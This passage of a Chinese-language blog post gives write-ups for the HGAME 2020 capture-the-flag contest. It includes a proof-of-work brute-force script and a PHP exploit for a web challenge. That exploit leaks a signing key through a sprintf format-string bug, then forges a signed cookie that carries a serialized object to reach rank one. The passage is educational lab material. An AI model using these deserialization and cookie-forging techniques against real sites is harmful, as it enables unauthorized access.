class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> os, sys, signal</span><br><span class="line"><span class="keyword">import</span> string, random</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>(<span class="params">socketserver.BaseRequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_recvall</span>(<span class="params">self</span>):</span></span><br><span class="line">        BUFF_SIZE = <span class="number">2048</span></span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            part = self.request.recv(BUFF_SIZE)</span><br><span class="line">            data += part</span><br><span class="line">            <span class="keyword">if</span> len(part) &lt; BUFF_SIZE:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> data.strip()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">self, msg, newline=True</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> newline: msg += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">            self.request.sendall(msg)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv</span>(<span class="params">self, prompt=<span class="string">b&#x27;&gt; &#x27;</span></span>):</span></span><br><span class="line">        self.send(prompt, newline=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> self._recvall()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>(<span class="params">self</span>):</span></span><br><span class="line">        random.seed( os.urandom(<span class="number">8</span>) )</span><br><span class="line">        proof = <span class="string">&#x27;&#x27;</span>.join([ random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">20</span>) ])</span><br><span class="line">        _hexdigest = sha256(proof.encode()).hexdigest()</span><br><span class="line">        self.send(str.encode( <span class="string">&quot;sha256(XXXX+%s) == %s&quot;</span> % (proof[<span class="number">4</span>:],_hexdigest) ))</span><br><span class="line">        x = self.recv(prompt=<span class="string">b&#x27;Give me XXXX: &#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> len(x) != <span class="number">4</span> <span class="keyword">or</span> sha256(x+proof[<span class="number">4</span>:].encode()).hexdigest() != _hexdigest: </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self</span>):</span></span><br><span class="line">        signal.alarm(<span class="number">60</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.proof_of_work():</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.send(<span class="string">b&#x27;The secret code?&#x27;</span>)</span><br><span class="line">        _code = self.recv()</span><br><span class="line">        <span class="keyword">if</span> _code == <span class="string">b&#x27;I like playing Hgame&#x27;</span>:</span><br><span class="line">            self.send(<span class="string">b&#x27;Ok, you find me.&#x27;</span>)</span><br><span class="line">            self.send(<span class="string">b&#x27;Here is the flag: &#x27;</span> + FLAG)</span><br><span class="line">            self.send(<span class="string">b&#x27;Bye~&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.send(<span class="string">b&#x27;Rua!!!&#x27;</span>)</span><br><span class="line">        self.request.close()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadedServer</span>(<span class="params">socketserver.ThreadingMixIn, socketserver.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ForkedServer</span>(<span class="params">socketserver.ForkingMixIn, socketserver.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST, PORT = <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">1234</span></span><br><span class="line">    server = ForkedServer((HOST, PORT), Task)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure><p>写了个exp，很烂2333…..</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> socket,re</span><br><span class="line"></span><br><span class="line">s=string.ascii_letters+string.digits</span><br><span class="line">sk=socket.socket()</span><br><span class="line">sk.connect((<span class="string">&quot;47.98.192.231&quot;</span>,<span class="number">25678</span>))</span><br><span class="line">secret=sk.recv(<span class="number">1024</span>).decode()</span><br><span class="line">print(secret)</span><br><span class="line">ant=re.match(<span class="string">r&quot;sha256\(XXXX\+(\w&#123;16&#125;)\) == (\w&#123;64&#125;)&quot;</span>,secret).group(<span class="number">1</span>)</span><br><span class="line">txt=re.match(<span class="string">r&quot;sha256\(XXXX\+(\w&#123;16&#125;)\) == (\w&#123;64&#125;)&quot;</span>,secret).group(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> s:</span><br><span class="line">flag=i+j+k+l</span><br><span class="line"><span class="keyword">if</span> txt==sha256((flag+ant).encode()).hexdigest():</span><br><span class="line">print(flag)</span><br><span class="line">print(sk.recv(<span class="number">1024</span>).decode())</span><br><span class="line">sk.send(flag.encode())</span><br><span class="line">print(sk.recv(<span class="number">1024</span>).decode())</span><br><span class="line">sk.send(<span class="string">b&quot;I like playing Hgame&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> sk.recv(<span class="number">1024</span>):</span><br><span class="line">print(sk.recv(<span class="number">1024</span>).decode())</span><br><span class="line">exit()</span><br></pre></td></tr></table></figure><h2 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h2><h3 id="web-2"><a href="#web-2" class="headerlink" title="web"></a>web</h3><h4 id="序列之争-Ordinal-Scale"><a href="#序列之争-Ordinal-Scale" class="headerlink" title="序列之争 - Ordinal Scale"></a>序列之争 - Ordinal Scale</h4><p><code>source.zip</code>有源码，在<code>game.php</code>中可以看到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>($game-&gt;rank-&gt;Get() === <span class="number">1</span>)&#123;<span class="meta">?&gt;</span></span><br><span class="line"> &lt;h2&gt;hgame&#123;flag_is_here&#125;&lt;/h2&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> &#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>即当我们成为第⼀名时，即可获得 flag。跟进去看⼀下<code>Get()</code>⽅法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;rank&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;Set(rand(<span class="number">2</span>, <span class="number">1000</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;Set($_SESSION[<span class="string">&#x27;rank&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Set</span>(<span class="params">$no</span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;rank = $no; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;rank; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>$rank</code>是从Session⾥⾯取得的。因此我们需要找到设置 Session 的办法。</p><p>在<code>Rank</code>类的析构函数中存在设置 Session。同时在 108 ⾏存在<code>unserialize</code>反序列化函数，同时结合</p><p>该题名字为 序列之争 因此尝试使⽤反序列化来修改 Session。</p><p>然⽽在 <code>unserialize</code> 函数前有⼀步检查：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$monsterData = base64_decode($_COOKIE[<span class="string">&#x27;monster&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(strlen($monsterData) &gt; <span class="number">32</span>)&#123;</span><br><span class="line">$sign = substr($monsterData, <span class="number">-32</span>);</span><br><span class="line">$monsterData = substr($monsterData, <span class="number">0</span>, strlen($monsterData) - <span class="number">32</span>);</span><br><span class="line"><span class="keyword">if</span>(md5($monsterData . <span class="keyword">$this</span>-&gt;encryptKey) === $sign)&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;monsterData = unserialize($monsterData);</span><br></pre></td></tr></table></figure><p><code>$monsterData</code> 是通过对 <code>Cookie monster</code> 进⾏字符串截取得到的， <code>monster</code> 后有⼀个 32 位的 md5</p><p><code>$sign</code> 进⾏签名检查。这⾥我们就需要知道 <code>encryptKey</code> 的值才能伪造这个签名。</p><p>⽽ <code>encryptKey</code> 是来⾃于 <code>Game</code> 类的 <code>sign</code> 属性：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params">$data</span>)</span>&#123;</span><br><span class="line"><span class="keyword">foreach</span>($data <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;welcomeMsg = sprintf(<span class="keyword">$this</span>-&gt;welcomeMsg, $value);</span><br><span class="line"><span class="keyword">$this</span>-&gt;sign .= md5(<span class="keyword">$this</span>-&gt;sign . $value);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>⼊参 <code>$data</code> 的值为数组 <code>[$playerName, $this-&gt;encryptKey]</code> ，元素中含有 <code>encryptKey</code> 。</p><p>分析⼀下这个⽅法的功能，这个 <code>init()</code> ⽅法是⽤来初始化欢迎语 <code>welcomeMsg</code> 以及 <code>sign</code> 。</p><p>其中欢迎语 <code>welcomeMsg</code> 的⽣成中使⽤了 <code>sprintf</code> 函数，且放在⼀个循环内，第⼆轮循环的 <code>$value</code> 值</p><p>即为 <code>encryptKey</code> 。因此存在格式化字符串漏洞。</p><p>进⼊游戏，输⼊名字： <code>%s</code> ，即可使得在第⼆轮循环中 <code>%s</code> 的值被 <code>sprintf</code> 函数换成 <code>encryptKey</code> 。点</p><p>击 <code>Link Start</code>，拿到 <code>encryptKey</code> ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL</span><br></pre></td></tr></table></figure><p>然后就可以伪造 <code>$sign</code> 了。</p><p>但 <code>Rank</code> 类的析构函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment">// 确保程序是跑在服务器上的！</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;serverKey = $_SERVER[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;key === <span class="keyword">$this</span>-&gt;serverKey)&#123;</span><br><span class="line">$_SESSION[<span class="string">&#x27;rank&#x27;</span>] = <span class="keyword">$this</span>-&gt;rank;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">// ⾮正常访问</span></span><br><span class="line">session_start();</span><br><span class="line">session_destroy();</span><br><span class="line"> setcookie(<span class="string">&#x27;monster&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"> header(<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在设置 Session 前会⽐对 <code>key</code> 以及 <code>serverKey</code> 的值，其中 <code>serverKey</code> 是来⾃于服务器的环境变量，这</p><p>个值我们⽆法获得。</p><p>这⾥有两种⽅法：⼀种是引⽤赋值，可以将 <code>$this-&gt;serverKey</code> 的引⽤赋值给给 <code>$this-&gt;key</code> 。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;key = &amp;<span class="keyword">$this</span>-&gt;serverKey</span><br></pre></td></tr></table></figure><p>另⼀种⽅法是直接不设置 <code>$key</code> 属性。反序列化时会取 <code>Rank</code> 类中的默认值。</p><p>捋下思路：</p><ul><li>输入<code>%s</code>获得<code>encryptKey</code></li><li>构造执行反序列化函数，反序列化<code>Rank</code>类，将<code>$rank</code>设置成1</li><li>反序列化时会执行<code>__destruct()</code>方法可以引⽤赋值或者不赋值两种方式</li></ul><p>最终 exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rank</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $rank = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">private</span> $serverKey;</span><br><span class="line"> <span class="keyword">private</span> $key;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="keyword">$this</span>-&gt;key = &amp;<span class="keyword">$this</span>-&gt;serverKey;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">$data = [<span class="string">&#x27;moonback&#x27;</span>, <span class="string">&#x27;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&#x27;</span>];</span><br><span class="line">$sign = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>($data <span class="keyword">as</span> $value)&#123;</span><br><span class="line">$sign .= md5($sign . $value);</span><br><span class="line">&#125;</span><br><span class="line">$rank = serialize(<span class="keyword">new</span> Rank());</span><br><span class="line"><span class="keyword">echo</span>(base64_encode($rank . md5($rank . $sign)));</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rank</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $rank = <span class="number">1</span>; </span><br><span class="line">&#125;</span><br><span class="line">$data = [<span class="string">&#x27;moonback&#x27;</span>, <span class="string">&#x27;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&#x27;</span>];</span><br><span class="line">$sign = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>($data <span class="keyword">as</span> $value)&#123;</span><br><span class="line">$sign .= md5($sign . $value);</span><br><span class="line">&#125;</span><br><span class="line">$rank = serialize(<span class="keyword">new</span> Rank());</span><br><span class="line"><span class="keyword">echo</span>(base64_encode($rank . md5($rank . $sign)));</span><br></pre></td></tr></table></figure><p>输⼊名字 <code>moonback</code> 进⼊游戏，替换 <code>monster Cookie</code>，刷新⻚⾯，成为第⼀名拿到 flag</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIM截图20200210114759.png" style="zoom: 67%;"><p>贴一下代码：</p><p><strong>cardinal.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">private</span> $encryptKey = <span class="string">&#x27;SUPER_SECRET_KEY_YOU_WILL_NEVER_KNOW&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $welcomeMsg = <span class="string">&#x27;%s, Welcome to Ordinal Scale!&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $sign = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $rank;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$playerName</span>)</span>&#123;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;player&#x27;</span>] = $playerName;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">            $_SESSION[<span class="string">&#x27;exp&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $data = [$playerName, <span class="keyword">$this</span>-&gt;encryptKey];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;init($data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;monster = <span class="keyword">new</span> Monster(<span class="keyword">$this</span>-&gt;sign);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rank = <span class="keyword">new</span> Rank();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params">$data</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>($data <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;welcomeMsg = sprintf(<span class="keyword">$this</span>-&gt;welcomeMsg, $value);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;sign .= md5(<span class="keyword">$this</span>-&gt;sign . $value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rank</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $rank;</span><br><span class="line">    <span class="keyword">private</span> $serverKey;    </span><br><span class="line">    <span class="keyword">private</span> $key = <span class="string">&#x27;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;rank&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;Set(rand(<span class="number">2</span>, <span class="number">1000</span>));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;Set($_SESSION[<span class="string">&#x27;rank&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Set</span>(<span class="params">$no</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rank = $no;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;rank;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Fight</span>(<span class="params">$monster</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($monster[<span class="string">&#x27;no&#x27;</span>] &gt;= <span class="keyword">$this</span>-&gt;rank)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rank -= rand(<span class="number">5</span>, <span class="number">15</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;rank &lt;= <span class="number">2</span>)&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;rank = <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_SESSION[<span class="string">&#x27;exp&#x27;</span>] += rand(<span class="number">20</span>, <span class="number">200</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;result&#x27;</span> =&gt; <span class="literal">true</span>, </span><br><span class="line">                <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;&lt;span style=&quot;color:green;&quot;&gt;Congratulations! You win! &lt;/span&gt;&#x27;</span></span><br><span class="line">            );</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;result&#x27;</span> =&gt; <span class="literal">false</span>, </span><br><span class="line">                <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;&lt;span style=&quot;color:red;&quot;&gt;You die!&lt;/span&gt;&#x27;</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// 确保程序是跑在服务器上的！</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;serverKey = $_SERVER[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;key === <span class="keyword">$this</span>-&gt;serverKey)&#123;</span><br><span class="line">            $_SESSION[<span class="string">&#x27;rank&#x27;</span>] = <span class="keyword">$this</span>-&gt;rank;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// 非正常访问</span></span><br><span class="line">            session_start();</span><br><span class="line">            session_destroy();</span><br><span class="line">            setcookie(<span 